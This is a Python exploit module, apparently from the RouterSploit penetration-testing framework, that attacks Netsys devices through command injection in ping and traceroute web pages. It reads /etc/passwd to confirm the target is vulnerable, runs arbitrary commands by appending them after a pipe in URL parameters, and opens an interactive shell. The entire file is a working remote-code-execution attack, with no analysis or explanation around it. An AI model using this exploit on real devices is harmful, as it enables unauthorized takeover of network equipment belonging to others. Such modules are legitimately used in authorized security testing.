import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Netsys Multi RCE",
        "description": "Exploits Netsys multiple remote command execution vulnerabilities that allows "
                       "executing commands on operating system level.",
        "authors": (
            "admin <admin[at]bbs.00wz.top>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://bbs.00wz.top/forum.php?mod=viewthread&tid=12630",
        ),
        "devices": (
            "Multiple Netsys",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(9090, "Target HTTP port")

    def __init__(self):
        self.injections = [
            "/view/IPV6/ipv6networktool/traceroute/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|{}",
            "/view/systemConfig/systemTool/ping/ping.php?text_target=127.0.0.1&text_pingcount=1&text_packetsize=40|{}",
            "/view/systemConfig/systemTool/traceRoute/traceroute.php?text_target=127.0.0.1&text_ageout=2&text_minttl=1&text_maxttl=1|{}"
        ]

        self.valid = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsle")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        marker = utils.random_text(16)
        cmd = cmd.replace(" ", "+")
        payload = "echo+{};{};echo+{};".format(marker, cmd, marker)

        path = self.valid.format(payload)
        response = self.http_request(
            method="GET",
            path=path
        )
        if response is None:
            return ""

        regexp = "{}(.+?){}".format(marker, marker)
        res = re.findall(regexp, response.text, re.DOTALL)

        if len(res):
            return res[0]

        return ""

    @mute
    def check(self):
        cmd = "cat+/etc/passwd;"

        for injection in self.injections:
            path = injection.format(cmd)

            response = self.http_request(
                method="GET",
                path=path
            )
            if response is None:
                continue

            if utils.detect_file_content(response.text, "/etc/passwd"):
                self.valid = injection
                return True  # target is vulnerable

        return False  # target not vulnerable
